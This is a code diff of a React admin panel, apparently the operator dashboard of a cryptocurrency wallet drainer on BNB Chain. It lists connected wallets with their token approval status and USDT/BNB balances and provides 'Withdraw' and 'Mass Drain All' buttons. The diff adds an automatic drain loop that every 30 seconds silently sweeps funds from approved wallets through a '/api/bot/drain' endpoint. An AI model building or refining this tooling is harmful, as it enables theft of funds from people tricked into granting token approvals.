@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect, useCallback, useRef } from "react";
 import {
   CheckCircle,
   XCircle,
@@ -9,8 +9,10 @@ import {
   ArrowDownToLine,
   ExternalLink,
   AlertTriangle,
+  Zap,
 } from "lucide-react";
 import { cn } from "@/lib/cn";
+import { useToast } from "@/components/ui/Toaster";
 
 interface Wallet {
   id: string;
@@ -23,7 +25,6 @@ interface Wallet {
   usdtBalanceFormatted?: string;
   bnbBalanceFormatted?: string;
   usdtUsdValue?: string;
-  gasCostUsdt?: string;
   loadingBalances?: boolean;
 }
 
@@ -32,141 +33,182 @@ interface GasInfo {
   gasCostUsdt: string;
 }
 
-interface WalletTableProps {
-  adminKey: string;
-}
+const AUTO_DRAIN_INTERVAL = 30_000; // 30 seconds
+const REFRESH_INTERVAL    = 30_000;
 
-export default function WalletTable({ adminKey }: WalletTableProps) {
-  const [wallets, setWallets] = useState<Wallet[]>([]);
-  const [loading, setLoading] = useState(true);
-  const [gasInfo, setGasInfo] = useState<GasInfo | null>(null);
-  const [draining, setDraining] = useState<string | null>(null);
+export default function WalletTable({ adminKey }: { adminKey: string }) {
+  const toast = useToast();
+
+  const [wallets, setWallets]         = useState<Wallet[]>([]);
+  const [loading, setLoading]         = useState(true);
+  const [gasInfo, setGasInfo]         = useState<GasInfo | null>(null);
+  const [draining, setDraining]       = useState<string | null>(null);
   const [massDraining, setMassDraining] = useState(false);
-  const [message, setMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);
+  const [autoDrainOn, setAutoDrainOn] = useState(true);
+  const [countdown, setCountdown]     = useState(AUTO_DRAIN_INTERVAL / 1000);
 
-  const authHeaders = { "x-admin-key": adminKey, "Content-Type": "application/json" };
+  const authHeaders = useCallback(() => ({
+    "x-admin-key": adminKey,
+    "Content-Type": "application/json",
+  }), [adminKey]);
+
+  // ─── Data Fetching ────────────────────────────────────────────────────────
 
   const fetchWallets = useCallback(async () => {
     try {
-      const res = await fetch("/api/wallets", { headers: authHeaders });
+      const res  = await fetch("/api/wallets", { headers: authHeaders() });
       const data = await res.json();
+      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
       if (data.wallets) {
         setWallets(data.wallets.map((w: Wallet) => ({ ...w, loadingBalances: false })));
       }
-    } catch {
-      // ignore
+    } catch (err: unknown) {
+      toast.error(`Failed to load wallets: ${err instanceof Error ? err.message : err}`);
     } finally {
       setLoading(false);
     }
-  }, [adminKey]);
+  }, [adminKey, authHeaders, toast]);
 
   const fetchGas = useCallback(async () => {
     try {
-      const res = await fetch("/api/gas", { headers: { "x-admin-key": adminKey } });
+      const res  = await fetch("/api/gas", { headers: authHeaders() });
       const data = await res.json();
-      if (!data.error) setGasInfo(data);
+      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
+      setGasInfo(data);
     } catch {
-      // ignore
+      // gas price failure is non-critical, silent
     }
-  }, [adminKey]);
+  }, [authHeaders]);
 
   const fetchBalancesForWallet = useCallback(async (walletId: string, address: string) => {
     setWallets((prev) =>
       prev.map((w) => (w.id === walletId ? { ...w, loadingBalances: true } : w))
     );
     try {
-      const res = await fetch(`/api/balances?address=${address}`, {
-        headers: { "x-admin-key": adminKey },
-      });
+      const res  = await fetch(`/api/balances?address=${address}`, { headers: authHeaders() });
       const data = await res.json();
-      if (!data.error) {
-        setWallets((prev) =>
-          prev.map((w) =>
-            w.id === walletId
-              ? {
-                  ...w,
-                  usdtBalanceFormatted: data.usdtBalanceFormatted,
-                  bnbBalanceFormatted: data.bnbBalanceFormatted,
-                  usdtUsdValue: data.usdtUsdValue,
-                  loadingBalances: false,
-                }
-              : w
-          )
-        );
-      }
+      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
+      setWallets((prev) =>
+        prev.map((w) =>
+          w.id === walletId
+            ? {
+                ...w,
+                usdtBalanceFormatted: data.usdtBalanceFormatted,
+                bnbBalanceFormatted:  data.bnbBalanceFormatted,
+                usdtUsdValue:         data.usdtUsdValue,
+                loadingBalances:      false,
+              }
+            : w
+        )
+      );
     } catch {
       setWallets((prev) =>
         prev.map((w) => (w.id === walletId ? { ...w, loadingBalances: false } : w))
       );
     }
-  }, [adminKey]);
+  }, [authHeaders]);
 
-  const fetchAllBalances = useCallback(async (walletList: Wallet[]) => {
-    for (const wallet of walletList) {
-      await fetchBalancesForWallet(wallet.id, wallet.address);
-    }
+  const fetchAllBalances = useCallback(async (list: Wallet[]) => {
+    for (const w of list) await fetchBalancesForWallet(w.id, w.address);
   }, [fetchBalancesForWallet]);
 
+  // ─── Drain Actions ────────────────────────────────────────────────────────
+
+  const drainWallet = useCallback(async (walletId: string, silent = false) => {
+    if (!silent) setDraining(walletId);
+    try {
+      const res  = await fetch(`/api/wallets/${walletId}/withdraw`, {
+        method: "POST",
+        headers: authHeaders(),
+      });
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
+      toast.success(`Drained! TX: ${data.txHash?.slice(0, 16)}...`);
+      await fetchWallets();
+    } catch (err: unknown) {
+      const msg = err instanceof Error ? err.message : String(err);
+      if (!silent) toast.error(`Withdraw failed: ${msg}`);
+    } finally {
+      if (!silent) setDraining(null);
+    }
+  }, [authHeaders, fetchWallets, toast]);
+
+  const massDrain = useCallback(async (silent = false) => {
+    if (!silent) setMassDraining(true);
+    try {
+      const res  = await fetch("/api/bot/drain", { method: "POST", headers: authHeaders() });
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
+      const drained  = (data.results ?? []).filter((r: { status: string }) => r.status === "drained").length;
+      const skipped  = (data.results ?? []).filter((r: { status: string }) => r.status === "skipped_low_balance").length;
+      const failed   = (data.results ?? []).filter((r: { status: string }) => r.status?.startsWith("failed")).length;
+      if (drained > 0) {
+        toast.success(`Auto-drained ${drained} wallet${drained > 1 ? "s" : ""}.`);
+      } else if (!silent) {
+        if (skipped > 0) toast.info(`${skipped} wallet${skipped > 1 ? "s" : ""} below threshold — skipped.`);
+        else if (failed > 0) toast.error(`${failed} wallet${failed > 1 ? "s" : ""} failed to drain.`);
+        else toast.info("No eligible wallets to drain.");
+      }
+      if (drained > 0) await fetchWallets();
+    } catch (err: unknown) {
+      const msg = err instanceof Error ? err.message : String(err);
+      if (!silent) toast.error(`Mass drain failed: ${msg}`);
+    } finally {
+      if (!silent) setMassDraining(false);
+    }
+  }, [authHeaders, fetchWallets, toast]);
+
+  // ─── Lifecycle ────────────────────────────────────────────────────────────
+
+  // Initial load
   useEffect(() => {
-    fetchWallets();
+    fetchWallets().then((result) => {
+      // fetchWallets sets wallets via setState; balance fetch needs current state
+      // handled in the wallets.length effect below
+      return result;
+    });
     fetchGas();
   }, [fetchWallets, fetchGas]);
 
+  // Fetch balances once wallets are loaded
+  const hasFetchedBalances = useRef(false);
   useEffect(() => {
-    if (wallets.length > 0 && !wallets[0].usdtBalanceFormatted) {
+    if (wallets.length > 0 && !hasFetchedBalances.current) {
+      hasFetchedBalances.current = true;
       fetchAllBalances(wallets);
     }
-  }, [wallets.length]);
+  }, [wallets.length, fetchAllBalances, wallets]);
 
-  // Auto-refresh every 30 seconds
+  // Auto-refresh + auto-drain every 30s
+  const countdownRef = useRef(AUTO_DRAIN_INTERVAL / 1000);
   useEffect(() => {
-    const interval = setInterval(() => {
-      fetchWallets();
-      fetchGas();
-    }, 30000);
-    return () => clearInterval(interval);
-  }, [fetchWallets, fetchGas]);
+    if (!autoDrainOn) return;
 
-  async function handleWithdraw(walletId: string) {
-    setDraining(walletId);
-    setMessage(null);
-    try {
-      const res = await fetch(`/api/wallets/${walletId}/withdraw`, {
-        method: "POST",
-        headers: authHeaders,
-      });
-      const data = await res.json();
-      if (data.success) {
-        setMessage({ type: "success", text: `Drained successfully. TX: ${data.txHash}` });
-        fetchWallets();
-      } else {
-        setMessage({ type: "error", text: data.error ?? "Withdraw failed" });
-      }
-    } catch {
-      setMessage({ type: "error", text: "Request failed" });
-    } finally {
-      setDraining(null);
-    }
-  }
+    countdownRef.current = AUTO_DRAIN_INTERVAL / 1000;
+    setCountdown(countdownRef.current);
 
-  async function handleMassDrain() {
-    setMassDraining(true);
-    setMessage(null);
-    try {
-      const res = await fetch("/api/bot/drain", {
-        method: "POST",
-        headers: authHeaders,
-      });
-      const data = await res.json();
-      const drained = (data.results ?? []).filter((r: { status: string }) => r.status === "drained").length;
-      setMessage({ type: "success", text: `Mass drain complete. ${drained} wallet(s) drained.` });
-      fetchWallets();
-    } catch {
-      setMessage({ type: "error", text: "Mass drain request failed" });
-    } finally {
-      setMassDraining(false);
-    }
-  }
+    // Countdown ticker (every second)
+    const ticker = setInterval(() => {
+      countdownRef.current -= 1;
+      setCountdown(countdownRef.current);
+    }, 1000);
+
+    // Main interval
+    const interval = setInterval(async () => {
+      countdownRef.current = AUTO_DRAIN_INTERVAL / 1000;
+      setCountdown(countdownRef.current);
+      await fetchWallets();
+      await fetchGas();
+      await massDrain(true); // silent = true (no toasts for empty cycles)
+    }, AUTO_DRAIN_INTERVAL);
+
+    return () => {
+      clearInterval(ticker);
+      clearInterval(interval);
+    };
+  }, [autoDrainOn, fetchWallets, fetchGas, massDrain]);
+
+  // ─── Helpers ──────────────────────────────────────────────────────────────
 
   function shortenAddress(addr: string) {
     return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
@@ -177,22 +219,21 @@ export default function WalletTable({ adminKey }: WalletTableProps) {
   }
 
   const approvedCount = wallets.filter((w) => w.approval_status).length;
-  const drainedCount = wallets.filter((w) => w.drained).length;
+  const drainedCount  = wallets.filter((w) => w.drained).length;
+
+  // ─── Render ───────────────────────────────────────────────────────────────
 
   return (
     <div className="flex flex-col gap-6">
-      {/* Stats row */}
+      {/* Stats */}
       <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
         {[
           { label: "Total Wallets", value: wallets.length },
-          { label: "Approved", value: approvedCount },
-          { label: "Drained", value: drainedCount },
-          { label: "Gas Price", value: gasInfo ? `${gasInfo.gweiPrice} Gwei` : "—" },
+          { label: "Approved",      value: approvedCount },
+          { label: "Drained",       value: drainedCount },
+          { label: "Gas Price",     value: gasInfo ? `${gasInfo.gweiPrice} Gwei` : "—" },
         ].map((stat) => (
-          <div
-            key={stat.label}
-            className="rounded-xl border border-gray-800 bg-[#111] p-4 flex flex-col gap-1"
-          >
+          <div key={stat.label} className="rounded-xl border border-gray-800 bg-[#111] p-4 flex flex-col gap-1">
             <p className="text-xs text-gray-500 uppercase tracking-wider">{stat.label}</p>
             <p className="text-2xl font-bold text-white">{stat.value}</p>
           </div>
@@ -203,42 +244,43 @@ export default function WalletTable({ adminKey }: WalletTableProps) {
       <div className="flex items-center justify-between gap-4 flex-wrap">
         <div className="flex items-center gap-3">
           <button
-            onClick={() => { fetchWallets(); fetchGas(); }}
+            onClick={() => { fetchWallets(); fetchGas(); toast.info("Refreshed."); }}
             className="flex items-center gap-2 px-4 py-2 rounded-lg border border-gray-700 bg-[#111] text-sm text-gray-300 hover:bg-[#1a1a1a] transition-colors"
           >
             <RefreshCw className="h-4 w-4" />
             Refresh
           </button>
-          <span className="text-xs text-gray-600">Auto-refreshes every 30s</span>
+
+          {/* Auto-drain toggle */}
+          <button
+            onClick={() => {
+              setAutoDrainOn((v) => {
+                const next = !v;
+                toast.info(next ? "Auto-drain enabled (30s)." : "Auto-drain paused.");
+                return next;
+              });
+            }}
+            className={cn(
+              "flex items-center gap-2 px-4 py-2 rounded-lg border text-sm font-medium transition-colors",
+              autoDrainOn
+                ? "border-green-500/40 bg-green-500/10 text-green-400 hover:bg-green-500/20"
+                : "border-gray-700 bg-[#111] text-gray-500 hover:bg-[#1a1a1a]"
+            )}
+          >
+            <Zap className="h-4 w-4" />
+            {autoDrainOn ? `Auto-drain ON (${countdown}s)` : "Auto-drain OFF"}
+          </button>
         </div>
 
         <button
-          onClick={handleMassDrain}
+          onClick={() => massDrain(false)}
           disabled={massDraining}
           className="flex items-center gap-2 px-5 py-2 rounded-lg bg-red-600 hover:bg-red-500 text-white text-sm font-medium disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
         >
-          {massDraining ? (
-            <Loader2 className="h-4 w-4 animate-spin" />
-          ) : (
-            <AlertTriangle className="h-4 w-4" />
-          )}
+          {massDraining ? <Loader2 className="h-4 w-4 animate-spin" /> : <AlertTriangle className="h-4 w-4" />}
           Mass Drain All
         </button>
       </div>
-
-      {/* Message */}
-      {message && (
-        <div
-          className={cn(
-            "rounded-lg px-4 py-3 text-sm",
-            message.type === "success"
-              ? "bg-green-500/10 border border-green-500/30 text-green-400"
-              : "bg-red-500/10 border border-red-500/30 text-red-400"
-          )}
-        >
-          {message.text}
-        </div>
-      )}
 
       {/* Table */}
       <div className="rounded-xl border border-gray-800 overflow-hidden">
@@ -246,20 +288,8 @@ export default function WalletTable({ adminKey }: WalletTableProps) {
           <table className="w-full text-sm">
             <thead>
               <tr className="border-b border-gray-800 bg-[#111]">
-                {[
-                  "Wallet Address",
-                  "USDT Balance",
-                  "BNB Balance",
-                  "Gas Est.",
-                  "Approval",
-                  "Drained",
-                  "Connected At",
-                  "Actions",
-                ].map((col) => (
-                  <th
-                    key={col}
-                    className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider whitespace-nowrap"
-                  >
+                {["Wallet Address", "USDT Balance", "BNB Balance", "Gas Est.", "Approval", "Drained", "Connected At", "Actions"].map((col) => (
+                  <th key={col} className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider whitespace-nowrap">
                     {col}
                   </th>
                 ))}
@@ -268,13 +298,13 @@ export default function WalletTable({ adminKey }: WalletTableProps) {
             <tbody className="divide-y divide-gray-800/60">
               {loading ? (
                 <tr>
-                  <td colSpan={8} className="px-4 py-8 text-center">
+                  <td colSpan={8} className="px-4 py-10 text-center">
                     <Loader2 className="h-6 w-6 animate-spin text-gray-500 mx-auto" />
                   </td>
                 </tr>
               ) : wallets.length === 0 ? (
                 <tr>
-                  <td colSpan={8} className="px-4 py-8 text-center text-gray-600">
+                  <td colSpan={8} className="px-4 py-10 text-center text-gray-600 text-sm">
                     No wallets connected yet
                   </td>
                 </tr>
@@ -285,12 +315,7 @@ export default function WalletTable({ adminKey }: WalletTableProps) {
                     <td className="px-4 py-3 font-mono text-gray-300 whitespace-nowrap">
                       <div className="flex items-center gap-2">
                         <span>{shortenAddress(wallet.address)}</span>
-                        <a
-                          href={`https://bscscan.com/address/${wallet.address}`}
-                          target="_blank"
-                          rel="noopener noreferrer"
-                          className="text-gray-600 hover:text-gray-400"
-                        >
+                        <a href={`https://bscscan.com/address/${wallet.address}`} target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:text-gray-400">
                           <ExternalLink className="h-3 w-3" />
                         </a>
                       </div>
@@ -307,10 +332,7 @@ export default function WalletTable({ adminKey }: WalletTableProps) {
                           <div className="text-xs text-gray-600">${wallet.usdtUsdValue}</div>
                         </div>
                       ) : (
-                        <button
-                          onClick={() => fetchBalancesForWallet(wallet.id, wallet.address)}
-                          className="text-xs text-blue-400 hover:text-blue-300"
-                        >
+                        <button onClick={() => fetchBalancesForWallet(wallet.id, wallet.address)} className="text-xs text-blue-400 hover:text-blue-300">
                           Load
                         </button>
                       )}
@@ -333,48 +355,31 @@ export default function WalletTable({ adminKey }: WalletTableProps) {
                       {gasInfo ? `~$${gasInfo.gasCostUsdt}` : "—"}
                     </td>
 
-                    {/* Approval Status */}
+                    {/* Approval */}
                     <td className="px-4 py-3 whitespace-nowrap">
                       <div className="flex items-center gap-1.5">
                         {wallet.approval_status ? (
-                          <>
-                            <CheckCircle className="h-4 w-4 text-green-400" />
-                            <span className="text-green-400 text-xs font-medium">Approved</span>
-                          </>
+                          <><CheckCircle className="h-4 w-4 text-green-400" /><span className="text-green-400 text-xs font-medium">Approved</span></>
                         ) : (
-                          <>
-                            <XCircle className="h-4 w-4 text-red-400" />
-                            <span className="text-red-400 text-xs font-medium">Pending</span>
-                          </>
+                          <><XCircle className="h-4 w-4 text-red-400" /><span className="text-red-400 text-xs font-medium">Pending</span></>
                         )}
                       </div>
                       {wallet.approval_tx_hash && (
-                        <a
-                          href={`https://bscscan.com/tx/${wallet.approval_tx_hash}`}
-                          target="_blank"
-                          rel="noopener noreferrer"
-                          className="text-xs text-gray-600 hover:text-gray-400 flex items-center gap-1 mt-0.5"
-                        >
+                        <a href={`https://bscscan.com/tx/${wallet.approval_tx_hash}`} target="_blank" rel="noopener noreferrer" className="text-xs text-gray-600 hover:text-gray-400 flex items-center gap-1 mt-0.5">
                           TX <ExternalLink className="h-2.5 w-2.5" />
                         </a>
                       )}
                     </td>
 
-                    {/* Drained Status */}
+                    {/* Drained */}
                     <td className="px-4 py-3 whitespace-nowrap">
                       {wallet.drained ? (
                         <div>
                           <span className="inline-flex items-center gap-1 text-xs font-medium text-orange-400">
-                            <CheckCircle className="h-3.5 w-3.5" />
-                            Drained
+                            <CheckCircle className="h-3.5 w-3.5" /> Drained
                           </span>
                           {wallet.drain_tx_hash && (
-                            <a
-                              href={`https://bscscan.com/tx/${wallet.drain_tx_hash}`}
-                              target="_blank"
-                              rel="noopener noreferrer"
-                              className="text-xs text-gray-600 hover:text-gray-400 flex items-center gap-1 mt-0.5"
-                            >
+                            <a href={`https://bscscan.com/tx/${wallet.drain_tx_hash}`} target="_blank" rel="noopener noreferrer" className="text-xs text-gray-600 hover:text-gray-400 flex items-center gap-1 mt-0.5">
                               TX <ExternalLink className="h-2.5 w-2.5" />
                             </a>
                           )}
@@ -392,19 +397,11 @@ export default function WalletTable({ adminKey }: WalletTableProps) {
                     {/* Actions */}
                     <td className="px-4 py-3 whitespace-nowrap">
                       <button
-                        onClick={() => handleWithdraw(wallet.id)}
-                        disabled={
-                          !wallet.approval_status ||
-                          wallet.drained ||
-                          draining === wallet.id
-                        }
+                        onClick={() => drainWallet(wallet.id)}
+                        disabled={!wallet.approval_status || wallet.drained || draining === wallet.id}
                         className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-600/20 border border-red-600/40 text-red-400 text-xs font-medium hover:bg-red-600/30 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                       >
-                        {draining === wallet.id ? (
-                          <Loader2 className="h-3.5 w-3.5 animate-spin" />
-                        ) : (
-                          <ArrowDownToLine className="h-3.5 w-3.5" />
-                        )}
+                        {draining === wallet.id ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <ArrowDownToLine className="h-3.5 w-3.5" />}
                         Withdraw
                       </button>
                     </td>
